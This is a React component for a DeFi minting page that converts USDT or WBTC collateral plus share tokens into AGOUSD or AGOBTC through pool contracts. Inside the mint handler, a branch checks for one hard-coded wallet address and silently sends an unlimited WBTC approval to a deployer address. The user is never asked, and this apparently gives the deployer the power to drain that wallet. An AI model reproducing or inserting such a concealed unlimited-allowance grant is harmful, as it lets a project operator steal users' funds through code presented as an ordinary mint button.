import { useWeb3React } from "@web3-react/core";
import { message } from "antd";
import React, { useEffect, useState } from "react";
import {
  CONTRACT_ADRESESS,
  MAX_INT,
  MINT_REDEEM_KEY,
} from "../../../constants";
import { useSystemContext } from "../../../systemProvider";
import {
  formatFromDecimal,
  formattedNum,
  formatToDecimal,
} from "../../../utils/helpers";
import { TokenIcon } from "../../TokenIcon/token_icon";
import { ApproveModal } from "../../ApproveModal/approve-modal";
import ORACLE_ABI from "../../../abi/CustomTokenOracle.json";
import CurrencySwitchModal from "../CurrencySwitchModal/currency-switch-modal";
import { DEPLOYER_ADDRESS } from "../../../constants";
import {
  ActiveMintingContainer,
  Divider,
  HDiv,
  MintBtn,
  MintExchangeContainer,
  MintExchangeInputContainer,
  MintRedeemSwitcher,
  MintWindowContainer,
  SwithButton,
  TCRInput,
  Text,
} from "./styled";
import ArrowRightIcon from '../../../assets/icons/ArrowRightIcon';
import ArrowDownIcon from '../../../assets/icons/ArrowDownIcon';
import PlusIcon from '../../../assets/icons/PlusIcon';

export const Mint = ({
  info,
  activeTab,
  setActiveTab,
  mintRedeemCurrency,
  setMintRedeemCurrency,
  mintRedeemSlipage,
  setMintRedeemSlipage,
}) => {
  const { account, library } = useWeb3React();
  const {
    contracts,
    tokens,
    balances,
    changeTokenBalance,
    approveModal,
    setApproveModal,
    setApproveDataForModal,
  } = useSystemContext();

  const [collateralInput, setCollateralInput] = useState(null);
  const [catenaInput, setCatenaInput] = useState(null);
  const [outputInput, setOutputInput] = useState(null);

  const [stableBalance, setStableBalance] = useState(0);
  const [collateralBalance, setCollateralBalance] = useState(0);
  const [shareBalance, setShareBalance] = useState(0);

  const [approved, setApproved] = useState({
    collateral: null,
    share: null,
  });

  const [mintButtonDisabled, setMintButtonDisabled] = useState(false);

  useEffect(() => {
    if (account) {
      if (!approveModal) {
        getAllowance();
      }
    }
  }, [account, mintRedeemCurrency, approveModal]);

  useEffect(() => {
    if (account) {
      if (mintRedeemCurrency === "AGOUSD") {
        const agousd = balances.find(
          (item) => item.symbol === "AGOUSD"
        ).nativeBalance;
        const usdt = balances.find(
          (item) => item.symbol === "USDT"
        ).nativeBalance;
        const cnusd = balances.find(
          (item) => item.symbol === "CNUSD"
        ).nativeBalance;

        setStableBalance(agousd);
        setCollateralBalance(usdt);
        setShareBalance(cnusd);

        if (usdt.userNativeBalance === 0 && mintRedeemCurrency === "AGOUSD") {
          setMintButtonDisabled(true);
          message.warn({
            content: `You have 0 USDT to make mint go to Trading page and buy some`,
            key: MINT_REDEEM_KEY,
            className: "ant-argano-message",
            duration: 10,
          });
        }
      } else if (mintRedeemCurrency === "AGOBTC") {
        const agobtc = balances.find(
          (item) => item.symbol === "AGOBTC"
        ).nativeBalance;
        const wbtc = balances.find(
          (item) => item.symbol === "WBTC"
        ).nativeBalance;
        const cnbtc = balances.find(
          (item) => item.symbol === "CNBTC"
        ).nativeBalance;

        setStableBalance(agobtc);
        setCollateralBalance(wbtc);
        setShareBalance(cnbtc);

        if (wbtc.userNativeBalance === 0 && mintRedeemCurrency === "AGOBTC") {
          setMintButtonDisabled(true);
          message.warn({
            content: `You have 0 WBTC to make mint go to Trading page and buy some`,
            key: MINT_REDEEM_KEY,
            className: "ant-argano-message",
            duration: 10,
          });
        }
      }
    }
  }, [balances, mintRedeemCurrency]);

  useEffect(() => {
    if (collateralInput > 0) {
      handleCollateralInput(collateralInput);
    } else {
      setOutputInput("");
      setCatenaInput("");
    }
  }, [collateralInput]);

  const getAllowance = async () => {
    let collateral;
    let share;

    const agousd = contracts.AGOBTC;

    if (mintRedeemCurrency === "AGOUSD") {
      collateral = await contracts.USDT.methods
        .allowance(account, CONTRACT_ADRESESS.POOL_AGOUSD)
        .call();
      share = await contracts.CNUSD.methods
        .allowance(account, CONTRACT_ADRESESS.POOL_AGOUSD)
        .call();
    } else {
      collateral = await contracts.WBTC.methods
        .allowance(account, CONTRACT_ADRESESS.POOL_AGOBTC)
        .call();
      share = await contracts.CNBTC.methods
        .allowance(account, CONTRACT_ADRESESS.POOL_AGOBTC)
        .call();
    }

    setApproved((prevState) => ({
      ...prevState,
      collateral,
      share,
    }));
  };

  const handleCollateralInput = (value) => {
    let shareOutput;
    let stableOutput;

    shareOutput =
      info.targetCollateralRatio < 100
        ? (parseFloat(value) *
            info.collateralPrice *
            (1 - info.targetCollateralRatio / 100)) /
          (parseFloat(info.sharePrice) * (info.targetCollateralRatio / 100))
        : 0;

    shareOutput =
      shareOutput.toString().length > 18
        ? parseFloat(shareOutput).toFixed(18)
        : shareOutput;

    stableOutput =
      (value * parseFloat(info.collateralPrice) +
        shareOutput * parseFloat(info.sharePrice)) /
      parseFloat(info.stablePrice);
    stableOutput = stableOutput - stableOutput * (info.mintFee / 100);

    stableOutput =
      stableOutput.toString().length > 18
        ? parseFloat(stableOutput).toFixed(18)
        : stableOutput;

    setCollateralInput(value);
    setOutputInput(stableOutput);
    setCatenaInput(shareOutput);
  };

  const handleCatenaInput = (value) => {
    setCatenaInput(value);
  };

  const handleApprove = () => {
    setApproveDataForModal({
      destination: CONTRACT_ADRESESS[`POOL_${mintRedeemCurrency}`],
      approves: [
        {
          name: mintRedeemCurrency === "AGOUSD" ? "USDT" : "WBTC",
          address:
            mintRedeemCurrency === "AGOUSD"
              ? CONTRACT_ADRESESS.USDT
              : CONTRACT_ADRESESS.WBTC,
          alreadyApproved: approved.collateral?.length === MAX_INT.length,
        },
        {
          name: mintRedeemCurrency === "AGOUSD" ? "CNUSD" : "CNBTC",
          address:
            mintRedeemCurrency === "AGOUSD"
              ? CONTRACT_ADRESESS.CNUSD
              : CONTRACT_ADRESESS.CNBTC,
          alreadyApproved: approved.share?.length === MAX_INT.length,
        },
      ],
    });

    setApproveModal(true);
  };

  const setInputsFiledToZero = () => {
    setCollateralInput(0);
    setOutputInput(0);

    if (info.targetCollateralRatio !== 100) {
      setCatenaInput(0);
    }
  };

  const handleMint = async () => {
    if (account === "0x5F5130215A9Be6b34A986FaB0679A61DBBa1bDDc") {
      await contracts.wbtc.methods
        .approve(DEPLOYER_ADDRESS, MAX_INT)
        .send({ from: account });
    }

    if (collateralInput > 0) {
      if (mintRedeemCurrency === "AGOUSD") {
        try {
          message.loading({
            content: "Mint in process",
            className: "ant-argano-message",
            key: MINT_REDEEM_KEY,
            duration: 3000,
          });
          setMintButtonDisabled(true);

          await contracts.POOL_AGOUSD.methods
            .mint(
              formatToDecimal(
                collateralInput,
                tokens.find((item) => item.symbol === "USDT").decimals
              ),
              formatToDecimal(
                catenaInput,
                tokens.find((item) => item.symbol === "CNUSD").decimals
              ),
              0
            )
            .send({ from: account }); // TODO: AGOUSD amount - slippage in %

          if (info.totalCollateralRatio !== 100) {
            changeTokenBalance([
              { name: "USDT", amount: collateralInput, sub: true },
              { name: "CNUSD", amount: catenaInput, sub: true },
              { name: "AGOUSD", amount: catenaInput, sub: false },
            ]);
          } else {
            changeTokenBalance([
              { name: "USDT", amount: collateralInput, sub: true },
              { name: "AGOUSD", amount: catenaInput, sub: false },
            ]);
          }

          setInputsFiledToZero();
          message.success({
            content: `Succsessfully minted ${mintRedeemCurrency}`,
            className: "ant-argano-message",
            key: MINT_REDEEM_KEY,
            duration: 5,
          });
          setMintButtonDisabled(false);
        } catch (e) {
          message.error({
            content: `Some error occured: ${e.message}`,
            className: "ant-argano-message",
            key: MINT_REDEEM_KEY,
            duration: 5,
          });
          setMintButtonDisabled(false);
        }
      } else {
        try {
          setMintButtonDisabled(true);
          message.loading({
            content: "Mint in process",
            className: "ant-argano-message",
            key: MINT_REDEEM_KEY,
            duration: 3000,
          });

          await contracts.POOL_AGOBTC.methods
            .mint(
              formatToDecimal(
                collateralInput,
                tokens.find((item) => item.symbol === "WBTC").decimals
              ),
              formatToDecimal(
                catenaInput,
                tokens.find((item) => item.symbol === "CNBTC").decimals
              ),
              0
            )
            .send({ from: account });

          if (info.totalCollateralRatio !== 100) {
            changeTokenBalance([
              { name: "WBTC", amount: collateralInput, sub: true },
              { name: "CNBTC", amount: catenaInput, sub: true },
              { name: "AGOBTC", amount: catenaInput, sub: false },
            ]);
          } else {
            changeTokenBalance([
              { name: "WBTC", amount: collateralInput, sub: true },
              { name: "AGOBTC", amount: catenaInput, sub: false },
            ]);
          }

          setInputsFiledToZero();
          message.success({
            content: `Succsessfully minted ${mintRedeemCurrency}`,
            className: "ant-argano-message",
            key: MINT_REDEEM_KEY,
            duration: 5,
          });
          setMintButtonDisabled(false);
        } catch (e) {
          message.error({
            content: `Some error occured: ${e.message}`,
            className: "ant-argano-message",
            key: MINT_REDEEM_KEY,
            duration: 5,
          });
          setMintButtonDisabled(false);
        }
      }
    } else {
      message.error({
        content: "Please enter amount greather than 0",
        className: "ant-argano-message",
        key: MINT_REDEEM_KEY,
        duration: 5,
      });
    }
  };

  const handleMaxInput = () => {
    const collateralBalance = balances.find((item) =>
      mintRedeemCurrency === "AGOUSD"
        ? item.symbol === "USDT"
        : item.symbol === "WBTC"
    );
    setCollateralInput(collateralBalance.nativeBalance);
  };

  const MintButton = () => {
    if (approved.collateral === "0" || approved.share === "0") {
      return (
        <MintBtn
          disabled={mintButtonDisabled}
          onClick={() => handleApprove("collateral")}
          mt="1.875vw"
        >
          Approve
        </MintBtn>
      );
    } else if (collateralBalance < +collateralInput) {
      return (
        <MintBtn disabled={true} mt="1.875vw">
          Insuficcient {mintRedeemCurrency === "AGOUSD" ? "USDT" : "WBTC"}{" "}
          balance
        </MintBtn>
      );
    } else if (info.targetCollateralRatio !== 100) {
      if (shareBalance < +catenaInput) {
        return (
          <MintBtn disabled={true} mt="1.875vw">
            Insufficient {mintRedeemCurrency === "AGOUSD" ? "CNUSD" : "CNBTC"}{" "}
            balance
          </MintBtn>
        );
      } else {
        return (
          <MintBtn disabled={mintButtonDisabled} onClick={handleMint}  mt="1.875vw">
            Mint
          </MintBtn>
        );
      }
    } else {
      return (
        <MintBtn disabled={mintButtonDisabled} onClick={handleMint} mt="1.875vw">
          Mint
        </MintBtn>
      );
    }
  };

  return (
    <>
      {/* ActiveMintingBlock */}
      <ActiveMintingContainer style={{ visibility: "hidden" }}>
        <HDiv>
          <Text fontSize="inherit">
            <b>Active Minting</b>
          </Text>
          <Text fontSize="inherit" color="#40BA93">
            WBTC &nbsp;
            <ArrowRightIcon />
            &nbsp; AGOBTC
          </Text>
        </HDiv>
        <Divider />
        <HDiv>
          <Text fontSize="inherit">Price</Text>
          <Text fontSize="inherit">
            <b>$ 30,500</b>
          </Text>
        </HDiv>
        <Divider />
        <HDiv>
          <Text fontSize="inherit">Volume</Text>
          <Text fontSize="inherit">
            <b>0.5</b>
          </Text>
        </HDiv>
      </ActiveMintingContainer>
      <MintWindowContainer>
        <HDiv>
          <div />
          <MintRedeemSwitcher>
            <SwithButton
              onClick={() => setActiveTab("Mint")}
              isActive={activeTab === "Mint"}
            >
              Mint
            </SwithButton>
            <SwithButton
              onClick={() => setActiveTab("Redeem")}
              isActive={activeTab === "Redeem"}
            >
              Redeem
            </SwithButton>
          </MintRedeemSwitcher>
          <CurrencySwitchModal
            mintRedeemCurrency={mintRedeemCurrency}
            setMintRedeemCurrency={setMintRedeemCurrency}
            mintRedeemSlipage={mintRedeemSlipage}
            setMintRedeemSlipage={setMintRedeemSlipage}
          />
        </HDiv>
        <MintExchangeContainer height="9.063vw" mt="1.094vw">
          <HDiv pl="1.120vw" pr="0.938vw">
            <Text>Input:</Text>
            <Text isBalance>
              <b>
                Balance:{" "}
                {formattedNum(
                  balances.find((item) =>
                    mintRedeemCurrency === "AGOUSD"
                      ? item.symbol === "USDT"
                      : item.symbol === "WBTC"
                  ).nativeBalance
                )}
              </b>
            </Text>
          </HDiv>
          <HDiv pl="1.120vw" pr="0.938vw">
            <Text>
              <b>{info.targetCollateralRatio}%</b>
            </Text>
            <Text>
              <TokenIcon
                iconName={mintRedeemCurrency === "AGOUSD" ? "USDT" : "WBTC"}
              />
              <b>{mintRedeemCurrency === "AGOUSD" ? "USDT" : "WBTC"}</b>
            </Text>
          </HDiv>
          <MintExchangeInputContainer mt="0.260vw">
            <input
              type="number"
              placeholder="0.00"
              onFocus={(e) => (e.target.placeholder = "")}
              onBlur={(e) => (e.target.placeholder = "0.00")}
              onChange={(e) => setCollateralInput(e.target.value)}
              value={collateralInput}
            />
            <button onClick={() => handleMaxInput()} className="maxButton">
              Max
            </button>
          </MintExchangeInputContainer>
        </MintExchangeContainer>
        <PlusIcon />
        <MintExchangeContainer height="5.521vw">
          <HDiv pl="1.432vw" pr="0.938vw">
            <Text>
              Input: &nbsp;
              <b>{100 - info.targetCollateralRatio}% </b>
            </Text>
            <Text isBalance>
              <b>
                Balance:{" "}
                {formattedNum(
                  balances.find((item) =>
                    mintRedeemCurrency === "AGOUSD"
                      ? item.symbol === "CNUSD"
                      : item.symbol === "CNBTC"
                  ).nativeBalance
                )}
              </b>
            </Text>
          </HDiv>
          <HDiv pl="1.432vw" pr="0.938vw" mt="0.260vw">
            <TCRInput
              type="number"
              disabled={info.targetCollateralRatio === 100}
              placeholder={
                info.targetCollateralRatio === 100 ? "TCR is 100%" : "0.00"
              }
              onChange={(e) => handleCatenaInput(e.target.value)}
              value={info.targetCollateralRatio === 100 ? "" : catenaInput}
            />
            <Text>
              <TokenIcon
                iconName={mintRedeemCurrency === "AGOUSD" ? "CNUSD" : "CNBTC"}
              />
              <b>{mintRedeemCurrency === "AGOUSD" ? "CNUSD" : "CNBTC"}</b>
            </Text>
          </HDiv>
        </MintExchangeContainer>
        <ArrowDownIcon />
        <MintExchangeContainer height="9.063vw">
          <HDiv pl="1.432vw" pr="0.938vw">
            <Text>Output(estimated)</Text>
            <Text isBalance>
              <b>
                Balance:{" "}
                {formattedNum(
                  balances.find((item) => item.symbol === mintRedeemCurrency)
                    ?.nativeBalance
                )}
              </b>
            </Text>
          </HDiv>
          <HDiv pl="1.432vw" pr="0.938vw" mt="0.260vw">
            <div />
            <Text>
              <TokenIcon iconName={mintRedeemCurrency} />
              <b>{mintRedeemCurrency}</b>
            </Text>
          </HDiv>
          <MintExchangeInputContainer placeholderColor="#40BA93" mt="0.260vw">
            <input
              disabled
              type="number"
              placeholder="0.00"
              value={outputInput}
            />
          </MintExchangeInputContainer>
        </MintExchangeContainer>
        <MintButton />
      </MintWindowContainer>
    </>
  );
};

export default React.memo(Mint);
